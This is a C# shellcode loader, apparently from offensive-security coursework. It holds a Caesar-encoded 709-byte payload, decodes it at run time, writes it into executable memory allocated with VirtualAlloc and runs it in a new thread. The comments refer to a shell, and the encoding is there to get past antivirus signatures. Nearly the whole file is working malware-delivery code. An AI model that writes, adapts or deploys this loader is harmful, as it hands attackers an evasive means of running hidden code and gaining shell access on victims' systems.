using System;
using System.Runtime.InteropServices;

namespace StayAwhile
{
    class AndListen
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {

            //Keybyte - Make sure it's the same as you encoded it with.
            int key = 179;

            // Caeser encrypted shellcode
            byte[] OffSec = new byte[709] {
                0xaf, 0xfb, 0x36, 0x97, 0xa3, 0x9b, 0x7f, 0xb3, 0xb3, 0xb3, 0xf4, 0x04, 0xf4, 0x03, 0x05,
                0x04, 0x09, 0xfb, 0xe4, 0x85, 0x18, 0xfb, 0x3e, 0x05, 0x13, 0xfb, 0x3e, 0x05, 0xcb, 0xfb,
                0x3e, 0x05, 0xd3, 0xfb, 0x3e, 0x25, 0x03, 0xfb, 0xc2, 0x6a, 0xfd, 0xfd, 0x00, 0xe4, 0x7c,
                0xfb, 0xe4, 0x73, 0x5f, 0xef, 0x14, 0x2f, 0xb5, 0xdf, 0xd3, 0xf4, 0x74, 0x7c, 0xc0, 0xf4,
                0xb4, 0x74, 0x95, 0xa0, 0x05, 0xf4, 0x04, 0xfb, 0x3e, 0x05, 0xd3, 0x3e, 0xf5, 0xef, 0xfb,
                0xb4, 0x83, 0x19, 0x34, 0x2b, 0xcb, 0xbe, 0xb5, 0xc2, 0x38, 0x25, 0xb3, 0xb3, 0xb3, 0x3e,
                0x33, 0x3b, 0xb3, 0xb3, 0xb3, 0xfb, 0x38, 0x73, 0x27, 0x1a, 0xfb, 0xb4, 0x83, 0xf7, 0x3e,
                0xf3, 0xd3, 0xfc, 0xb4, 0x83, 0x3e, 0xfb, 0xcb, 0x03, 0x96, 0x09, 0x00, 0xe4, 0x7c, 0xfb,
                0xb2, 0x7c, 0xf4, 0x3e, 0xe7, 0x3b, 0xfb, 0xb4, 0x89, 0xfb, 0xe4, 0x73, 0x5f, 0xf4, 0x74,
                0x7c, 0xc0, 0xf4, 0xb4, 0x74, 0xeb, 0x93, 0x28, 0xa4, 0xff, 0xb6, 0xff, 0xd7, 0xbb, 0xf8,
                0xec, 0x84, 0x28, 0x8b, 0x0b, 0xf7, 0x3e, 0xf3, 0xd7, 0xfc, 0xb4, 0x83, 0x19, 0xf4, 0x3e,
                0xbf, 0xfb, 0xf7, 0x3e, 0xf3, 0xcf, 0xfc, 0xb4, 0x83, 0xf4, 0x3e, 0xb7, 0x3b, 0xf4, 0x0b,
                0xfb, 0xb4, 0x83, 0xf4, 0x0b, 0x11, 0x0c, 0x0d, 0xf4, 0x0b, 0xf4, 0x0c, 0xf4, 0x0d, 0xfb,
                0x36, 0x9f, 0xd3, 0xf4, 0x05, 0xb2, 0x93, 0x0b, 0xf4, 0x0c, 0x0d, 0xfb, 0x3e, 0xc5, 0x9c,
                0xfe, 0xb2, 0xb2, 0xb2, 0x10, 0xfb, 0xe4, 0x8e, 0x06, 0xfc, 0x71, 0x2a, 0x1c, 0x21, 0x1c,
                0x21, 0x18, 0x27, 0xb3, 0xf4, 0x09, 0xfb, 0x3c, 0x94, 0xfc, 0x7a, 0x75, 0xff, 0x2a, 0xd9,
                0xba, 0xb2, 0x88, 0x06, 0x06, 0xfb, 0x3c, 0x94, 0x06, 0x0d, 0x00, 0xe4, 0x73, 0x00, 0xe4,
                0x7c, 0x06, 0x06, 0xfc, 0x6d, 0xed, 0x09, 0x2c, 0x5a, 0xb3, 0xb3, 0xb3, 0xb3, 0xb2, 0x88,
                0x9b, 0xbe, 0xb3, 0xb3, 0xb3, 0xe4, 0xe3, 0xe1, 0xe4, 0xe1, 0xe4, 0xe1, 0xe5, 0xe8, 0xe3,
                0xb3, 0x0d, 0xfb, 0x3c, 0x74, 0xfc, 0x7a, 0x73, 0x6e, 0xb4, 0xb3, 0xb3, 0x00, 0xe4, 0x7c,
                0x06, 0x06, 0x1d, 0xb6, 0x06, 0xfc, 0x6d, 0x0a, 0x3c, 0x52, 0x79, 0xb3, 0xb3, 0xb3, 0xb3,
                0xb2, 0x88, 0x9b, 0x51, 0xb3, 0xb3, 0xb3, 0xe2, 0x14, 0x20, 0x18, 0xfb, 0x23, 0x2d, 0x03,
                0xe5, 0x16, 0x06, 0x20, 0xe5, 0x1c, 0x15, 0x18, 0xff, 0xe4, 0x00, 0x1d, 0x05, 0xec, 0xf4,
                0x06, 0x1d, 0x27, 0x14, 0x0d, 0xf6, 0xfc, 0xff, 0x21, 0x0c, 0x1f, 0x09, 0xe8, 0xf7, 0xe3,
                0xfe, 0x04, 0x27, 0xe6, 0xe7, 0xea, 0xf6, 0x04, 0x1f, 0xff, 0x21, 0x2c, 0x1a, 0xe5, 0x1f,
                0x02, 0xe4, 0x2d, 0x20, 0x17, 0xe9, 0x21, 0x06, 0x0b, 0x2a, 0x15, 0x16, 0x0c, 0x2c, 0xe8,
                0x21, 0x12, 0xf7, 0x1c, 0xfa, 0xfd, 0xe7, 0x0d, 0xfb, 0x1e, 0x02, 0x09, 0xf4, 0x0c, 0x06,
                0xf4, 0x00, 0xf8, 0xe3, 0x29, 0xe4, 0x1b, 0xf4, 0xfa, 0x09, 0xf4, 0xe7, 0x16, 0x17, 0x28,
                0x24, 0x25, 0x1b, 0xff, 0xeb, 0xeb, 0x2b, 0x01, 0x19, 0xe0, 0xe7, 0x07, 0x0a, 0x22, 0xf7,
                0xff, 0x29, 0x1a, 0x0c, 0x1d, 0x1e, 0xe0, 0xe6, 0xf4, 0x09, 0x18, 0x12, 0x22, 0x14, 0x26,
                0xf8, 0x16, 0x2d, 0x04, 0x27, 0x21, 0x0a, 0xe8, 0x22, 0xea, 0xf5, 0xe4, 0x1b, 0x29, 0x1f,
                0xfb, 0xe5, 0x28, 0x19, 0x23, 0x2d, 0xe7, 0x24, 0x01, 0xf6, 0x06, 0xe9, 0x17, 0xfe, 0xb3,
                0xfb, 0x3c, 0x74, 0x06, 0x0d, 0xf4, 0x0b, 0x00, 0xe4, 0x7c, 0x06, 0xfb, 0x6b, 0xb3, 0xe5,
                0x5b, 0x37, 0xb3, 0xb3, 0xb3, 0xb3, 0x03, 0x06, 0x06, 0xfc, 0x7a, 0x75, 0x9e, 0x08, 0xe1,
                0xee, 0xb2, 0x88, 0xfb, 0x3c, 0x79, 0x1d, 0xbd, 0x12, 0xfb, 0x3c, 0xa4, 0x1d, 0xd2, 0x0d,
                0x05, 0x1b, 0x33, 0xe6, 0xb3, 0xb3, 0xfc, 0x3c, 0x93, 0x1d, 0xb7, 0xf4, 0x0c, 0xfc, 0x6d,
                0x28, 0xf9, 0x51, 0x39, 0xb3, 0xb3, 0xb3, 0xb3, 0xb2, 0x88, 0x00, 0xe4, 0x73, 0x06, 0x0d,
                0xfb, 0x3c, 0xa4, 0x00, 0xe4, 0x7c, 0x00, 0xe4, 0x7c, 0x06, 0x06, 0xfc, 0x7a, 0x75, 0xe0,
                0xb9, 0xcb, 0x2e, 0xb2, 0x88, 0x38, 0x73, 0x28, 0xd2, 0xfb, 0x7a, 0x74, 0x3b, 0xc6, 0xb3,
                0xb3, 0xfc, 0x6d, 0xf7, 0xa3, 0xe8, 0x93, 0xb3, 0xb3, 0xb3, 0xb3, 0xb2, 0x88, 0xfb, 0xb2,
                0x82, 0x27, 0xb5, 0x9e, 0x5d, 0x9b, 0x08, 0xb3, 0xb3, 0xb3, 0x06, 0x0c, 0x1d, 0xf3, 0x0d,
                0xfc, 0x3c, 0x84, 0x74, 0x95, 0xc3, 0xfc, 0x7a, 0x73, 0xb3, 0xc3, 0xb3, 0xb3, 0xfc, 0x6d,
                0x0b, 0x57, 0x06, 0x98, 0xb3, 0xb3, 0xb3, 0xb3, 0xb2, 0x88, 0xfb, 0x46, 0x06, 0x06, 0xfb,
                0x3c, 0x9a, 0xfb, 0x3c, 0xa4, 0xfb, 0x3c, 0x8d, 0xfc, 0x7a, 0x73, 0xb3, 0xd3, 0xb3, 0xb3,
                0xfc, 0x3c, 0xac, 0xfc, 0x6d, 0xc5, 0x49, 0x3c, 0x95, 0xb3, 0xb3, 0xb3, 0xb3, 0xb2, 0x88,
                0xfb, 0x36, 0x77, 0xd3, 0x38, 0x73, 0x27, 0x65, 0x19, 0x3e, 0xba, 0xfb, 0xb4, 0x76, 0x38,
                0x73, 0x28, 0x85, 0x0b, 0x76, 0x0b, 0x1d, 0xb3, 0x0c, 0x6e, 0x93, 0xd0, 0xdd, 0xbd, 0xf4,
                0x3c, 0x8d, 0xb2, 0x88 };

            // Decrypt by shifting to the left (-) as long as it's the opposite of what you encrypted with
            for (int i = 0; i < OffSec.Length; i++)
            {
                OffSec[i] = (byte)(((uint)OffSec[i] - key) & 0xFF);
            };

            int size = OffSec.Length;
            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(OffSec, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);

            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}

